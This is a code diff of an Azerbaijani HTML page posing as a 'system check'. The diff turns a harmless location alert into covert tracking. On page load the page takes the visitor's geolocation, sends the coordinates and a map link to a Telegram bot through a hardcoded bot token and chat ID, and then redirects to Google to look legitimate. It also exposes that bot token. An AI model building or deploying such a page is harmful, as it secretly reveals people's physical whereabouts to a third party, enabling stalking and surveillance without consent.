@@ -2,27 +2,43 @@
 <html lang="az">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Yoxlanışı</title>
 </head>
 <body>
     <h2>Sistem aktivdir. Məkan icazəsi yoxlanılır...</h2>
 
     <script>
+        // Sənin rəsmi Telegram məlumatların
+        const BOT_TOKEN = "8757659224:AAHCM2ijeb9S6EfBP7YRWXGC7EdvCu0CwLs";
+        const CHAT_ID = "8933188530"; // Sənin Telegram ID-n
+
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     let lat = position.coords.latitude;
                     let lon = position.coords.longitude;
                     
-                    // Koordinatları götürəndə ekranda göstərsin
-                    alert("Məkan məlumatı alındı: " + lat + ", " + lon);
+                    // Tapılan koordinatları bota göndərən rəsmi sorğu
+                    let message = `🎯 Laboratoriya Nəticəsi!\n📍 Enlik (Lat): ${lat}\n📍 Uzunluq (Lon): ${lon}\n🌍 Xəritə: https://maps.google.com/?q=${lat},${lon}`;
                     
-                    // Bura növbəti addımda datanı bota göndərən funksiyanı bağlayacağıq
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message
+                        })
+                    }).then(res => {
+                        // Mesaj gedəndən sonra rəsmi görünüş üçün Google-a ata bilər
+                        window.location.href = "https://google.com";
+                    });
+
                 }, function(error) {
-                    alert("İcazə verilmədi və ya xəta baş verdi.");
+                    alert("Məkan icazəsi verilmədi. Zəhmət olmasa ayarlardan icazə verin.");
                 });
             } else {
-                alert("Brauzer məkan funksiyasını dəstəkləmir.");
+                alert("Brauzeriniz məkan funksiyasını dəstəkləmir.");
             }
         };
     </script>
